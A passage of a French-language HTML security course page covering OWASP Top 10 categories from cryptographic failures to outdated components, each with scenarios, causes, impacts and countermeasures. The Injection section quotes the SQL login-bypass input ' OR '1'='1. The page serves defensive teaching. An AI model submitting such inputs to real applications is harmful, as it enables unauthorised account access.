                            <p>La sécurité applicative repose donc sur un <span class="em">équilibre entre sécurité, complexité et maintenabilité</span>.</p>
                        </li>
                        <li>
                            <h4>Conclusion :</h4>
                            <p>Le Broken Access Control est l'une des vulnérabilités les plus critiques et les plus répandues dans les applications web modernes.</p>
                            <p>Une approche rigoureuse intégrant la sécurité dès la conception, combinée à des contrôles techniques solides, est indispensable pour réduire les risques.</p>
                        </li>
                    </ol>
                    <h3>A2 - Cryptographic Failures :</h3>
                    <ol>
                        <li>
                            <h4>Présentation de la vulnérabilité :</h4>
                            <p>Les <span class="em">Cryptographic Failures</span> concernent une mauvaise utilisation ou une absence de mécanismes cryptographiques destinés à protéger les données sensibles.</p>
                            <p>Elles apparaissent lorsque des informations comme les mots de passe, données personnelles ou financières ne sont pas correctement chiffrées.</p>
                            <p>Cette vulnérabilité peut entraîner des fuites de données importantes.</p>
                            <p>Contrairement à une idée répandue, le problème ne réside pas uniquement dans l'algorithme utilisé, mais également dans :</p>
                            <ul>
                                <li>
                                    <p>la <span class="em">gestion des clés</span>,</p>
                                </li>
                                <li>
                                    <p>le <span class="em">choix des protocoles</span>,</p>
                                </li>
                                <li>
                                    <p>et la <span class="em">mise en oeuvre correcte</span> des mécanismes de chiffrement.</p>
                                </li>
                            </ul>
                            <p>Les erreurs de développement courantes incluent :</p>
                            <ul>
                                <li>
                                    <p>Absence de chiffrement des données sensibles (au repos ou en transit).</p>
                                </li>
                                <li>
                                    <p>Utilisation d'algorithmes obsolètes ou faibles (MD5, SHA-1, DES).</p>
                                </li>
                                <li>
                                    <p>Stockage de mots de passe en clair ou avec un hachage non sécurisé.</p>
                                </li>
                                <li>
                                    <p>Mauvaise gestion, rotation ou protection des clés cryptographiques.</p>
                                </li>
                                <li>
                                    <p>Désactivation ou mauvaise configuration de TLS.</p>
                                </li>
                            </ul>
                            <p>Les composants concernés sont principalement :</p>
                            <ul>
                                <li>
                                    <p>la couche réseau (communications client-serveur),</p>
                                </li>
                                <li>
                                    <p>les bases de données,</p>
                                </li>
                                <li>
                                    <p>les mécanismes d'authentification et de gestion des secrets.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Scénario(s) d'exploitation :</h4>
                            <h5>Scénario : Interception de données sensibles en transit :</h5>
                            <h6>Hypothèses techniques :</h6>
                            <ul>
                                <li>
                                    <p>L'application utilise le protocole <span class="em">HTTP</span> au lieu de <span class="em">HTTPS</span>.</p>
                                </li>
                                <li>
                                    <p>Les identifiants utilisateur sont transmis lors de l'authentification sans chiffrement.</p>
                                </li>
                                <li>
                                    <p>L'attaquant se trouve sur le même réseau que la victime (Wi-Fi public, réseau d'entreprise compromis).</p>
                                </li>
                            </ul>
                            <h6>Étapes générales :</h6>
                            <ol>
                                <li>
                                    <p>Un utilisateur se connecte à l'application via un réseau non sécurisé.</p>
                                </li>
                                <li>
                                    <p>Les identifiants (login/mot de passe) sont envoyés en clair au serveur.</p>
                                </li>
                                <li>
                                    <p>L'attaquant intercepte le trafic réseau à l'aide d'un outil de type sniffer.</p>
                                </li>
                                <li>
                                    <p>Les informations sensibles sont récupérées et réutilisées pour accéder au compte de la victime.</p>
                                </li>
                            </ol>
                            <p>Ce scénario illustre une <span class="em">défaillance cryptographique liée à l'absence de chiffrement des communications</span>, entraînant une compromission directe des comptes utilisateurs.</p>
                        </li>
                        <li>
                            <h4>Causes racines :</h4>
                            <p>Les causes racines de Cryptographic Failures sont généralement :</p>
                            <ul>
                                <li>
                                    <p>Un <span class="em">manque de connaissances en cryptographie appliquée</span> chez les développeurs.</p>
                                </li>
                                <li>
                                    <p>Une mauvaise configuration des protocoles de sécurité (TLS mal configuré, certificats expirés).</p>
                                </li>
                                <li>
                                    <p>L'absence de politiques claires concernant la gestion des clés et des secrets.</p>
                                </li>
                                <li>
                                    <p>Une confiance excessive dans des implémentations par défaut sans validation.</p>
                                </li>
                                <li>
                                    <p>L'absence d'audits de sécurité et de tests cryptographiques.</p>
                                </li>
                            </ul>
                            <p>Ces vulnérabilités résultent souvent de <span class="em">choix de conception inadéquats</span>, plutôt que d'erreurs ponctuelles de code.</p>
                        </li>
                        <li>
                            <h4>Impacts de sécurité :</h4>
                            <ul>
                                <li>
                                    <p><span class="em">Confidentialité</span> : fuite de données sensibles (mots de passe, données sensibles).</p>
                                </li>
                                <li>
                                    <p><span class="em">Intégrité</span> : possibilité de modification des données si les mécanismes de protection sont insuffisants.</p>
                                </li>
                                <li>
                                    <p><span class="em">Disponibilité</span> : impact indirect possible (exploitation conduisant à une compromission globale du système).</p>
                                </li>
                            </ul>
                            <p>L'impact global est considéré comme <span class="em">élevé</span>, notamment en raison des conséquences juridiques, financières et réputationnelles associées aux fuites de données.</p>
                        </li>
                        <li>
                            <h4>Contre-mesures logicielles :</h4>
                            <h5>Niveau code :</h5>
                            <ul>
                                <li>
                                    <p>Utiliser des algorithmes cryptographiques robustes et reconnus (AES-256, SHA-256, bcrypt).</p>
                                </li>
                                <li>
                                    <p>Ne jamais stocker les mots de passe en clair; utiliser un hachage avec salage.</p>
                                </li>
                                <li>
                                    <p>Éviter toute implémentation cryptographique "maison".</p>
                                </li>
                            </ul>
                            <h5>Niveau architecture applicative :</h5>
                            <ul>
                                <li>
                                    <p>Forcer l'utilisation de <span class="em">HTTPS/TLS</span> pour toutes les communications.</p>
                                </li>
                                <li>
                                    <p>Mettre en place une gestion centralisée et sécurisée des clés (HSM, vault).</p>
                                </li>
                                <li>
                                    <p>Séparer les secrets du code source (variables d'environnement, services dédiés).</p>
                                </li>
                            </ul>
                            <h5>Mesures préventives et détectives :</h5>
                            <ul>
                                <li>
                                    <p><span class="em">Préventives</span> : politiques de chiffrement, revues de code orientées sécurité.</p>
                                </li>
                                <li>
                                    <p><span class="em">Détectives</span> : audits cryptographiques, scans de vulnérabilités, surveillance des certificats.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Limites et risques résiduels :</h4>
                            <p>Malgré l'implémentation de contre-mesures efficaces :</p>
                            <ul>
                                <li>
                                    <p>Une clé compromise rend le chiffrement inefficace.</p>
                                </li>
                                <li>
                                    <p>Une mauvaise configuration peut annuler les bénéfices de la cryptographie.</p>
                                </li>
                                <li>
                                    <p>Les erreurs humaines et les évolutions applicatives restent des sources de risques.</p>
                                </li>
                            </ul>
                            <p>La cryptographie ne garantit pas une sécurité absolue, mais <span class="em">réduit significativement les risques lorsqu'elle est correctement mise en oeuvre</span>.</p>
                        </li>
                        <li>
                            <h4>Conclusion :</h4>
                            <p>Les Cryptographic Failures représentent une vulnérabilité critique, souvent sous-estimée, mais aux conséquences potentiellement graves.</p>
                            <p>Une approche rigoureuse combinant <span class="em">bonnes pratiques cryptographiques, choix technologiques adaptés et contrôles réguliers</span> est indispensable pour assurer la protection des données sensibles.</p>
                        </li>
                    </ol>
                    <h3>A3 - Injection :</h3>
                    <ol>
                        <li>
                            <h4>Présentation de la vulnérabilité :</h4>
                            <p>Les vulnérabilités d'<span class="em">Injection</span> surviennent lorsque des <span class="em">données fournies par un utilisateur non fiable</span> sont interprétées par une application comme des <span class="em">commandes ou requêtes</span> par un interpréteur (base de données, système d'exploitation, moteur LDAP, etc.).</p>
                            <p>Le cas le plus connu est l'<span class="em">injection SQL</span>, mais cette catégorie inclut également les injections NoSQL, les injections LDAP, les injections de commandes système et certaines formes d'injection de code.</p>
                            <p>Cette vulnérabilité apparaît lorsque l'application <span class="em">ne valide pas correctement les entrées utilisateur</span> et construit dynamiquement des requêtes ou commandes en y intégrant directement ces données.</p>
                            <p>Les composants concernés sont principalement :</p>
                            <ul>
                                <li>
                                    <p>la couche d'accès aux données,</p>
                                </li>
                                <li>
                                    <p>les API backend,</p>
                                </li>
                                <li>
                                    <p>les mécanismes d'authentification et de recherche.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Scénario(s) d'exploitation :</h4>
                            <h5>Scénario : Injection SQL lors de l'authentification :</h5>
                            <h6>Hypothèses techniques :</h6>
                            <ul>
                                <li>
                                    <p>L'application utilise une base de données relationnelle.</p>
                                </li>
                                <li>
                                    <p>Les requêtes SQL sont construites dynamiquement par concaténation de chaînes.</p>
                                </li>
                                <li>
                                    <p>Aucune validation ou protection spécifique n'est appliquée aux entrées utilisateur.</p>
                                </li>
                            </ul>
                            <h6>Étapes générales :</h6>
                            <ul>
                                <li>
                                    <p>Un utilisateur accède à un formulaire de connexion.</p>
                                </li>
                                <li>
                                    <p>Il saisit une charge malveillante dans le champ identifiant (par exemple : <span class="em">' OR '1'='1</span>).</p>
                                </li>
                                <li>
                                    <p>L'application insère directement cette entrée dans la requête SQL.</p>
                                </li>
                                <li>
                                    <p>La requête modifiée devient toujours vraie.</p>
                                </li>
                                <li>
                                    <p>L'attaquant est authentifié sans connaître de mot de passe valide.</p>
                                </li>
                            </ul>
                            <p>Ce scénario permet à un attaquant d'accéder à l'application de manière non autorisée et potentiellement d'exécuter des actions critiques.</p>
                        </li>
                        <li>
                            <h4>Causes racines :</h4>
                            <p>Les causes racines des vulnérabilités d'injection sont principalement :</p>
                            <ul>
                                <li>
                                    <p>L'absence ou l'insuffisance de <span class="em">validation et de filtrage des entrées utilisateur</span>.</p>
                                </li>
                                <li>
                                    <p>La construction dynamique de requêtes SQL ou commandes système.</p>
                                </li>
                                <li>
                                    <p>L'utilisation directe des données utilisateur dans des interpréteurs.</p>
                                </li>
                                <li>
                                    <p>Une méconnaissance des mécanismes de protection fournis par les frameworks.</p>
                                </li>
                                <li>
                                    <p>L'absence de tests de sécurité ciblant les injections.</p>
                                </li>
                            </ul>
                            <p>Il s'agit généralement d'un <span class="em">problème de conception et d'implémentation</span>, et non d'une simple erreur ponctuelle.</p>
                        </li>
                        <li>
                            <h4>Impacts de sécurité :</h4>
                            <ul>
                                <li>
                                    <p><span class="em">Confidentialité</span> : accès non autorisé à des données sensibles stockées en base de données.</p>
                                </li>
                                <li>
                                    <p><span class="em">Intégrité</span> : modification ou suppression de données.</p>
                                </li>
                                <li>
                                    <p><span class="em">Disponibilité</span> : suppression de tables, corruption de la base de données ou déni de service.</p>
                                </li>
                            </ul>
                            <p>L'impact global est considéré comme <span class="em">très élevé</span>, car les vulnérabilités d'injection peuvent mener à une <span class="em">compromission complète du système</span>.</p>
                        </li>
                        <li>
                            <h4>Contre-mesures logicielles :</h4>
                            <h5>Niveau code :</h5>
                            <ul>
                                <li>
                                    <p>Utiliser des <span class="em">requêtes préparées</span> ou des ORM sécurisés.</p>
                                </li>
                                <li>
                                    <p>Ne jamais concaténer directement les entrées utilisateur dans une requête.</p>
                                </li>
                                <li>
                                    <p>Valider et filtrer systématiquement les données en entrée.</p>
                                </li>
                                <li>
                                    <p>Échapper correctement les caractères spéciaux lorsque nécessaire.</p>
                                </li>
                            </ul>
                            <h5>Niveau architecture applicative :</h5>
                            <ul>
                                <li>
                                    <p>Séparer clairement la logique métier de l'accès aux données.</p>
                                </li>
                                <li>
                                    <p>Appliquer le principe du moindre privilège pour les comptes de base de données.</p>
                                </li>
                                <li>
                                    <p>Restreindre les droits des utilisateurs techniques (pas de droits administrateur).</p>
                                </li>
                            </ul>
                            <h5>Mesures préventives et détectives :</h5>
                            <ul>
                                <li>
                                    <p><span class="em">Préventives</span> : revues de code, tests automatisés contre les injections.</p>
                                </li>
                                <li>
                                    <p><span class="em">Détectives</span> : journalisation des erreurs SQL, alertes en cas de requêtes anormales.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Limites et risques résiduels :</h4>
                            <p>Malgré la mise en place de contre-mesures efficaces :</p>
                            <ul>
                                <li>
                                    <p>Des erreurs de configuration peuvent subsister.</p>
                                </li>
                                <li>
                                    <p>Des injections peuvent apparaître dans des composants tiers vulnérables.</p>
                                </li>
                                <li>
                                    <p>Des évolutions applicatives peuvent introduire de nouveaux points d'entrée.</p>
                                </li>
                            </ul>
                            <p>La sécurité contre les injections repose sur une <span class="em">discipline continue de développement sécurisé</span>.</p>
                        </li>
                        <li>
                            <h4>Conclusion :</h4>
                            <p>Les vulnérabilités d'injection figurent parmi les menaces les plus anciennes mais restent toujours très présentes dans les applications modernes.</p>
                            <p>Une approche combinant <span class="em">bonnes pratiques de développement, protections techniques robustes et contrôles réguliers</span> est indispensable pour limiter les risques et garantir la sécurité des applications.</p>
                        </li>
                    </ol>
                    <h3>A4 - Insecure Design :</h3>
                    <ol>
                        <li>
                            <h4>Présentation de la vulnérabilité :</h4>
                            <p>L'<span class="em">Insecure Design</span> désigne des failles de sécurité résultant de <span class="em">choix de conception applicative insuffisants ou inadaptés</span>, indépendamment de la qualité de l'implémentation technique.</p>
                            <p>Contrairement aux vulnérabilités liées à des erreurs de code, l'Insecure Design apparaît lorsque la sécurité <span class="em">n'est pas intégrée dès la phase de conception</span> de l'application. Même une implémentation correcte peut alors rester vulnérable.</p>
                            <p>Cette catégorie concerne notamment :</p>
                            <ul>
                                <li>
                                    <p>l'absence de modélisation des menaces,</p>
                                </li>
                                <li>
                                    <p>des règles métier non sécurisées,</p>
                                </li>
                                <li>
                                    <p>des mécanismes de contrôle incomplets ou inexistants</p>
                                </li>
                                <li>
                                    <p>une mauvaise gestion des flux utilisateurs et des cas d'abus.</p>
                                </li>
                            </ul>
                            <p>Les erreurs de conception courantes incluent :</p>
                            <ul>
                                <li>
                                    <p>Absence de contrôles de sécurité sur des fonctionnalités sensibles.</p>
                                </li>
                                <li>
                                    <p>Hypothèses de confiance irréalistes sur le comportement des utilisateurs.</p>
                                </li>
                                <li>
                                    <p>Manque de séparation entre les niveaux de privilèges.</p>
                                </li>
                                <li>
                                    <p>Absence de limites (quotas, délais, seuils).</p>
                                </li>
                            </ul>
                            <p>Les composants concernés sont principalement :</p>
                            <ul>
                                <li>
                                    <p>la logique métier,</p>
                                </li>
                                <li>
                                    <p>les flux applicatifs,</p>
                                </li>
                                <li>
                                    <p>l'architecture fonctionnelle globale.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Scénario(s) d'exploitation :</h4>
                            <h5>Scénario : Contournement des règles métier lors d'un processus critique :</h5>
                            <h6>Hypothèses techniques :</h6>
                            <ul>
                                <li>
                                    <p>L'application permet de modifier une commande après validation.</p>
                                </li>
                                <li>
                                    <p>Aucune règle métier ne limite le nombre ou le type de modifications possibles.</p>
                                </li>
                                <li>
                                    <p>L'utilisateur est authentifié et légitime.</p>
                                </li>
                            </ul>
                            <h6>Étapes générales :</h6>
                            <ol>
                                <li>
                                    <p>Un utilisateur valide une commande avec un prix initial.</p>
                                </li>
                                <li>
                                    <p>Après validation, il modifie manuellement les paramètres de la requête.</p>
                                </li>
                                <li>
                                    <p>L'application accepte la modification sans vérification métier.</p>
                                </li>
                                <li>
                                    <p>Le prix final est réduit de manière frauduleuse.</p>
                                </li>
                                <li>
                                    <p>La commande est traitée avec des données incohérentes.</p>
                                </li>
                            </ol>
                            <p>Ce scénario illustre une <span class="em">faille de conception</span>, où les règles métier n'ont pas été pensées pour résister à des usages abusifs.</p>
                        </li>
                        <li>
                            <h4>Causes racines :</h4>
                            <p>Les causes racines de l'Insecure Design sont généralement :</p>
                            <ul>
                                <li>
                                    <p>Une absence de <span class="em">prise en compte de la sécurité dès la phase de conception</span>.</p>
                                </li>
                                <li>
                                    <p>L'absence de <span class="em">modélisation des menaces</span> (threat modeling).</p>
                                </li>
                                <li>
                                    <p>Une focalisation excessive sur les fonctionnalités au détriment des abus possibles.</p>
                                </li>
                                <li>
                                    <p>Un manque de collaboration entre équipes métier et sécurité.</p>
                                </li>
                                <li>
                                    <p>L'absence de validation des règles métier côté serveur.</p>
                                </li>
                            </ul>
                            <p>Il s'agit principalement d'un <span class="em">problème organisationnel et conceptuel</span>, plus que technique.</p>
                        </li>
                        <li>
                            <h4>Impacts de sécurité :</h4>
                            <ul>
                                <li>
                                    <p><span class="em">Confidentialité</span> : exposition indirecte de données via des flux mal conçus.</p>
                                </li>
                                <li>
                                    <p><span class="em">Intégrité</span> : altération des données ou contournement des règles métier.</p>
                                </li>
                                <li>
                                    <p><span class="em">Disponibilité</span> : abus fonctionnels pouvant entraîner un déni de service.</p>
                                </li>
                            </ul>
                            <p>L'impact est considéré comme <span class="em">élevé</span>, car ces vulnérabilités sont souvent <span class="em">difficiles à détecter</span> et peuvent être exploitées de manière légitime.</p>
                        </li>
                        <li>
                            <h4>Contre-mesures logicielles :</h4>
                            <h5>Niveau code :</h5>
                            <ul>
                                <li>
                                    <p>Implémenter des contrôles stricts des règles métier côté serveur.</p>
                                </li>
                                <li>
                                    <p>Vérifier systématiquement la cohérence des états applicatifs.</p>
                                </li>
                                <li>
                                    <p>Ne pas supposer que l'utilisateur suit le chemin prévu.</p>
                                </li>
                            </ul>
                            <h5>Niveau architecture applicative :</h5>
                            <ul>
                                <li>
                                    <p>Intégrer la sécurité dès la phase de conception (Security by Design).</p>
                                </li>
                                <li>
                                    <p>Réaliser une modélisation des menaces pour chaque fonctionnalité critique.</p>
                                </li>
                                <li>
                                    <p>Séparer clairement les responsabilités et les niveaux de privilèges.</p>
                                </li>
                                <li>
                                    <p>Introduire des mécanismes de limitation (rate limiting, quotas).</p>
                                </li>
                            </ul>
                            <h5>Mesures préventives et détectives :</h5>
                            <ul>
                                <li>
                                    <p><span class="em">Préventives</span> : revues de conception, validation des cas d'abus.</p>
                                </li>
                                <li>
                                    <p><span class="em">Détectives</span> : journalisation des actions métiers sensibles, alertes sur comportements anormaux.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Limites et risques résiduels :</h4>
                            <p>Malgré des contre-mesures adaptées :</p>
                            <ul>
                                <li>
                                    <p>Les exigences métier évoluent rapidement.</p>
                                </li>
                                <li>
                                    <p>De nouveaux scénarios d'abus peuvent apparaître.</p>
                                </li>
                                <li>
                                    <p>Les erreurs humaines lors de la conception restent possibles.</p>
                                </li>
                            </ul>
                            <p>La sécurité par la conception implique donc un <span class="em">processus continu d'amélioration</span> et d'adaptation.</p>
                        </li>
                        <li>
                            <h4>Conclusion :</h4>
                            <p>L'Insecure Design représente une vulnérabilité critique car elle <span class="em">ne peut pas être corrigée uniquement par du code</span>.</p>
                            <p>Une approche intégrant la sécurité dès la conception, combinée à une analyse rigoureuse des usages et abus possibles, est essentielle pour construire des applications robustes et résilientes.</p>
                        </li>
                    </ol>
                    <h3>A5 - Security Misconfiguration :</h3>
                    <ol>
                        <li>
                            <h4>Présentation de la vulnérabilité :</h4>
                            <p>La vulnérabilité <span class="em">Security Misconfiguration</span> désigne des failles de sécurité résultant d'une <span class="em">configuration incorrecte, incomplète ou par défaut</span> des composants d'une application.</p>
                            <p>Elle peut concerner :</p>
                            <ul>
                                <li>
                                    <p>le serveur web,</p>
                                </li>
                                <li>
                                    <p>l'application elle-même,</p>
                                </li>
                                <li>
                                    <p>le framework utilisé,</p>
                                </li>
                                <li>
                                    <p>les bases de données,</p>
                                </li>
                                <li>
                                    <p>les services cloud ou conteneurs.</p>
                                </li>
                            </ul>
                            <p>Cette catégorie apparaît lorsque :</p>
                            <ul>
                                <li>
                                    <p>des fonctionnalités inutiles sont laissées actives,</p>
                                </li>
                                <li>
                                    <p>des paramètres de sécurité par défaut ne sont pas modifiés,</p>
                                </li>
                                <li>
                                    <p>des messages d'erreur trop détaillés sont exposés,</p>
                                </li>
                                <li>
                                    <p>des permissions excessives sont accordées.</p>
                                </li>
                            </ul>
                            <p>Les erreurs de configuration courantes incluent :</p>
                            <ul>
                                <li>
                                    <p>Activation du mode debug en production.</p>
                                </li>
                                <li>
                                    <p>Utilisation de comptes ou mots de passe par défaut.</p>
                                </li>
                                <li>
                                    <p>Absence d'en-têtes de sécurité HTTP.</p>
                                </li>
                                <li>
                                    <p>Mauvaise configuration des permissions ou des accès.</p>
                                </li>
                                <li>
                                    <p>Exposition de fichiers sensibles (backup, logs, fichiers de configuration).</p>
                                </li>
                            </ul>
                            <p>Les composants concernés sont principalement :</p>
                            <ul>
                                <li>
                                    <p>les serveurs web et applicatifs,</p>
                                </li>
                                <li>
                                    <p>les frameworks,</p>
                                </li>
                                <li>
                                    <p>les systèmes de déploiement et d'infrastructure.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Scénario(s) d'exploitation :</h4>
                            <h5>Scénario : Exploitation d'un mode debug actif en production :</h5>
                            <h6>Hypothèses techniques :</h6>
                            <ul>
                                <li>
                                    <p>L'application est déployée en environnement de production.</p>
                                </li>
                                <li>
                                    <p>Le mode debug du framework est activé.</p>
                                </li>
                                <li>
                                    <p>Les messages d'erreur sont affichés côté client.</p>
                                </li>
                            </ul>
                            <h6>Étapes générales :</h6>
                            <ol>
                                <li>
                                    <p>Un utilisateur provoque volontairement une erreur applicative.</p>
                                </li>
                                <li>
                                    <p>L'application affiche une page d'erreur détaillée.</p>
                                </li>
                                <li>
                                    <p>Les informations exposées incluent :</p>
                                    <ul>
                                        <li>
                                            <p>la structure interne de l'application,</p>
                                        </li>
                                        <li>
                                            <p>des chemins de fichiers,</p>
                                        </li>
                                        <li>
                                            <p>parfois des secrets ou identifiants.</p>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <p>L'attaquant utilise ces informations pour préparer une attaque ciblée.</p>
                                </li>
                                <li>
                                    <p>Une vulnérabilité plus critique est ensuite exploitée.</p>
                                </li>
                            </ol>
                            <p>Ce scénario illustre une <span class="em">exposition d'informations sensibles due à une mauvaise configuration</span>, facilitant des attaques ultérieures.</p>
                        </li>
                        <li>
                            <h4>Causes racines :</h4>
                            <p>Les causes racines de la Security Misconfiguration sont généralement :</p>
                            <ul>
                                <li>
                                    <p>Une absence de processus de configuration sécurisé pour les environnements.</p>
                                </li>
                                <li>
                                    <p>L'utilisation de configurations par défaut non durcies.</p>
                                </li>
                                <li>
                                    <p>Un manque de séparation entre environnements (développement, test, production).</p>
                                </li>
                                <li>
                                    <p>Une méconnaissance des paramètres de sécurité des frameworks et serveurs.</p>
                                </li>
                                <li>
                                    <p>L'absence de procédures de durcissement (hardening).</p>
                                </li>
                            </ul>
                            <p>Il s'agit souvent d'un <span class="em">problème opérationnel et organisationnel</span>, plus que d'un défaut de code.</p>
                        </li>
                        <li>
                            <h4>Impacts de sécurité :</h4>
                            <ul>
                                <li>
                                    <p><span class="em">Confidentialité</span> : divulgation d'informations sensibles ou internes.</p>
                                </li>
                                <li>
                                    <p><span class="em">Intégrité</span> : modification non autorisée de paramètres ou de données.</p>
                                </li>
                                <li>
                                    <p><span class="em">Disponibilité</span> : déni de service dû à une mauvaise configuration.</p>
                                </li>
                            </ul>
                            <p>L'impact global est considéré comme <span class="em">élevé</span>, car ces vulnérabilités sont <span class="em">fréquentes</span>, faciles à exploiter et souvent combinées à d'autres failles.</p>
                        </li>
                        <li>
                            <h4>Contre-mesures logicielles :</h4>
                            <h5>Niveau code :</h5>
                            <ul>
                                <li>
                                    <p>Désactiver toute fonctionnalité de debug en production.</p>
                                </li>
                                <li>
                                    <p>Ne jamais exposer d'informations sensibles dans les messages d'erreur.</p>
                                </li>
                                <li>
                                    <p>Vérifier systématiquement les paramètres de sécurité fournis par les frameworks.</p>
                                </li>
                            </ul>
                            <h5>Niveau architecture applicative :</h5>
                            <ul>
                                <li>
                                    <p>Mettre en place des configurations distinctes par environnement.</p>
                                </li>
                                <li>
                                    <p>Appliquer des procédures de durcissement des serveurs et services.</p>
                                </li>
                                <li>
                                    <p>Restreindre les permissions aux stricts besoins (principe du moindre privilège).</p>
                                </li>
                                <li>
                                    <p>Automatiser les configurations via des outils d'infrastructure as code.</p>
                                </li>
                            </ul>
                            <h5>Mesures préventives et détectives :</h5>
                            <ul>
                                <li>
                                    <p><span class="em">Préventives</span> : checklists de configuration sécurisée, audits réguliers.</p>
                                </li>
                                <li>
                                    <p><span class="em">Détectives</span> : scans de configuration, surveillance des changements, alertes.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Limites et risques résiduels :</h4>
                            <p>Malgré des contre-mesures appropriées :</p>
                            <ul>
                                <li>
                                    <p>Les configurations évoluent avec le temps.</p>
                                </li>
                                <li>
                                    <p>Des erreurs humaines peuvent survenir lors des déploiements.</p>
                                </li>
                                <li>
                                    <p>De nouveaux composants peuvent introduire des paramètres non sécurisés.</p>
                                </li>
                            </ul>
                            <p>La gestion des configurations doit donc être <span class="em">continue et rigoureuse</span>.</p>
                        </li>
                        <li>
                            <h4>Conclusion :</h4>
                            <p>La <span class="em">Security Misconfiguration</span> est l'une des vulnérabilités les plus courantes dans les applications modernes.</p>
                            <p>Une approche combinant <span class="em">bonnes pratiques de configuration, automatisation, contrôles réguliers et sensibilisation des équipes</span> est essentielle pour réduire durablement les risques.</p>
                        </li>
                    </ol>
                    <h3>A6 - Vulnerable and Outdated Components :</h3>
                    <ol>
                        <li>
                            <h4>Présentation de la vulnérabilité :</h4>
                            <p>La catégorie <span class="em">Vulnerable and Outdated Components</span> concerne l'utilisation de <span class="em">bibliothèques, frameworks, composants ou dépendances tierces</span> qui présentent des <span class="em">vulnérabilités connues</span> ou qui ne sont plus maintenus.</p>
                            <p>Les applications modernes reposent largement sur des composants externes (open source ou propriétaires). Lorsqu'un de ces composants contient une faille de sécurité, <span class="em">toute application qui l'intègre devient potentiellement vulnérable</span>, même si son propre code est correct.</p>
                            <p>Cette vulnérabilité apparaît notamment lorsque :</p>
                            <ul>
                                <li>
                                    <p>les dépendances ne sont pas mises à jour,</p>
                                </li>
                                <li>
                                    <p>les versions utilisées ne sont plus supportées,</p>
                                </li>
                                <li>
                                    <p>les correctifs de sécurité ne sont pas appliqués,</p>
                                </li>
                                <li>
                                    <p>l'origine ou l'intégrité des composants n'est pas vérifiée.</p>
                                </li>
                            </ul>
                            <p>Les erreurs courantes incluent :</p>
                            <ul>
                                <li>
                                    <p>Utilisation de versions obsolètes de frameworks.</p>
                                </li>
                                <li>
                                    <p>Absence d'inventaire des dépendances.</p>
                                </li>
                                <li>
                                    <p>Ignorance des alertes de vulnérabilités connues (CVE).</p>
                                </li>
                                <li>
                                    <p>Téléchargement de composants depuis des sources non fiables.</p>
                                </li>
                            </ul>
                            <p>Les composants concernés sont principalement :</p>
                            <ul>
                                <li>
                                    <p>les bibliothèques tierces,</p>
                                </li>
                                <li>
                                    <p>les frameworks applicatifs,</p>
                                </li>
                                <li>
                                    <p>les plugins,</p>
                                </li>
                                <li>
                                    <p>les systèmes de gestion de dépendances.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Scénario(s) d'exploitation :</h4>
                            <h5>Scénario : Exploitation d'une bibliothèque vulnérable :</h5>
                            <h6>Hypothèses techniques :</h6>
                            <ul>
                                <li>
                                    <p>L'application utilise une bibliothèque tierce contenant une vulnérabilité connue.</p>
                                </li>
                                <li>
                                    <p>Cette vulnérabilité est documentée publiquement (CVE).</p>
                                </li>
                                <li>
                                    <p>Aucun correctif n'a été appliqué.</p>
                                </li>
                            </ul>
                            <h6>Étapes générales :</h6>
                            <ol>
                                <li>
                                    <p>L'attaquant identifie les composants utilisés par l'application (bannières, fichiers publics, signatures).</p>
                                </li>
                                <li>
                                    <p>Il repère une version vulnérable d'une bibliothèque.</p>
                                </li>
                                <li>
                                    <p>Il consulte la documentation publique de la faille.</p>
                                </li>
                                <li>
                                    <p>Il exploite la vulnérabilité pour exécuter une action malveillante.</p>
                                </li>
                                <li>
                                    <p>L'attaque compromet partiellement ou totalement l'application.</p>
                                </li>
                            </ol>
                            <p>Ce scénario illustre une vulnérabilité <span class="em">héritée d'un composant tiers</span>, indépendante du code applicatif.</p>
                        </li>
                        <li>
                            <h4>Causes racines :</h4>
                            <p>Les causes racines de Vulnerable and Outdated Components sont généralement :</p>
                            <ul>
                                <li>
                                    <p>Une absence de politique de gestion des dépendances.</p>
                                </li>
                                <li>
                                    <p>Un manque de veille sur les vulnérabilités connues.</p>
                                </li>
                                <li>
                                    <p>Une dépendance excessive à des composants non maintenus.</p>
                                </li>
                                <li>
                                    <p>Une méconnaissance des composants réellement utilisés.</p>
                                </li>
                                <li>
                                    <p>Une difficulté à mettre à jour sans impacter l'application.</p>
                                </li>
                            </ul>
                            <p>Il s'agit principalement d'un <span class="em">problème de gouvernance et de maintenance</span>, plus que de développement pur.</p>
                        </li>
                        <li>
                            <h4>Impacts de sécurité :</h4>
                            <ul>
                                <li>
                                    <p><span class="em">Confidentialité</span> : fuite de données via l'exploitation d'un composant vulnérable.</p>
                                </li>
                                <li>
                                    <p><span class="em">Intégrité</span> : modification du comportement applicatif.</p>
                                </li>
                                <li>
                                    <p><span class="em">Disponibilité</span> : déni de service ou crash de l'application.</p>
                                </li>
                            </ul>
                            <p>L'impact global est considéré comme <span class="em">élevé</span>, car l'exploitation repose sur des failles publiquement connues et facilement exploitables.</p>
                        </li>
                        <li>
                            <h4>Contre-mesures logicielles :</h4>
                            <h5>Niveau code :</h5>
                            <ul>
                                <li>
                                    <p>Mettre à jour régulièrement les dépendances.</p>
                                </li>
                                <li>
                                    <p>Supprimer les bibliothèques inutilisées.</p>
                                </li>
                                <li>
                                    <p>Vérifier les changements de sécurité lors des mises à jour.</p>
                                </li>
                            </ul>
                            <h5>Niveau architecture applicative :</h5>
                            <ul>
                                <li>
                                    <p>Maintenir un inventaire clair des composants utilisés.</p>
                                </li>
                                <li>
                                    <p>Privilégier des composants maintenus et reconnus.</p>
                                </li>
                                <li>
                                    <p>Isoler les composants critiques lorsque possible.</p>
                                </li>
                                <li>
                                    <p>Mettre en place des mécanismes de validation d'intégrité.</p>
                                </li>
                            </ul>
                            <h5>Mesures préventives et détectives :</h5>
                            <ul>
                                <li>
                                    <p><span class="em">Préventives</span> : gestion des versions, politiques de mises à jour.</p>
                                </li>
                                <li>
                                    <p><span class="em">Détectives</span> : scanners de dépendances, surveillance des CVE, audits réguliers.</p>
